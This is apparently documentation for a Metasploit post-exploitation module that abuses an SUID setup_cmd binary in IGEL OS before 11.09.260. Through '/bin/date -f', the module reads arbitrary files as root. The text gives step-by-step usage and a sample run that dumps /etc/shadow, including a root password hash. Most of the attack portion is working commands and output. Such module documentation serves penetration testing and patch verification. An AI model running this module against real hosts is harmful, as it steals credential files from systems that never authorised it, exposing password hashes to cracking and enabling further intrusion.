## Vulnerable Application

IGEL OS < 11.09.260 with a `shell` or `meterpreter` session.

IGEL OS is a Linux-based operating system designed for endpoint devices,
primarily used in enterprise environments to provide secure access to virtual
workspaces. It focuses on enhancing security, simplifying management, and
improving user productivity across various sectors, including healthcare and
finance.

In previous versions, `/config/bin/setup_cmd` was an SUID binary, with a preset
list of files it could execute with elevated permissions. This allowed
`/bin/date -f` to be used for data extraction as root.

The dumped file is printed to screen and saved as loot.

## Verification Steps

1. Get a `shell` or `meterpreter` session on an IGEL OS < 11.09.260 host
2. Use: `use post/linux/gather/igel_dump_file`
3. Set: `set SESSION <id>`, replacing `<id>` with the session ID
4. Optionally, set `RPATH`
5. Run: `run`
6. Contents of file is displayed

## Options

| Name          | Description                |
| ------------- | -------------------------- |
| RPATH         | File on the target to dump |

## Scenarios

```
msf post(linux/gather/igel_dump_file) > set SESSION 1
SESSION => 1
msf post(linux/gather/igel_dump_file) > set RPATH /etc/shadow
RPATH => /etc/shadow
msf post(linux/gather/igel_dump_file) > run
[*] Executing command on target
[*] Command completed:
games:!!:20409::::::
man:!!:20409::::::
proxy:!!:20409::::::
backup:!!:20409::::::
list:!!:20409::::::
irc:!!:20409::::::
gnats:!!:20409::::::
systemd-coredump:!!:20409::::::
root:$6$BEtW8dG/eZ2nHb2X$vE1ZoeP.Z00bSB6dF9PVNHB3gcT1Wh5U2WUMPDBqBwMmZg.cshgiApIXVmDk.S.RhWTxKoZbZRWyqyMyHkzby.:20409:0:99999::::
rtkit:*:20409:0:99999:7:::
user:*:20409:0:99999::::
ruser::20409:0:99999::::
[*] Post module execution completed
```
